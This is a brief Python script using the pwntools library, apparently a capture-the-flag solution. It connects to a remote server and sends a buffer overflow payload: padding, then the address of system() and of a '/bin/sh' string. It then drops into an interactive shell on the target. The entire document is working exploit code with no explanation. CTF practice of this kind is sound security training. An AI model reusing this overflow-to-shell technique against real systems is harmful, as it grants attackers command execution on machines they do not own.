from pwn import *
#context.log_level = 'debug'

r = remote("111.198.29.45", 49673)

bin_sh = 0x0804A024
system = 0x08048320


r.recvuntil("Input:\n")
payload = 'a'*(0x88) + 'a' * 4 + p32(system) + p32(0) + p32(bin_sh)
r.send(payload)
r.interactive()
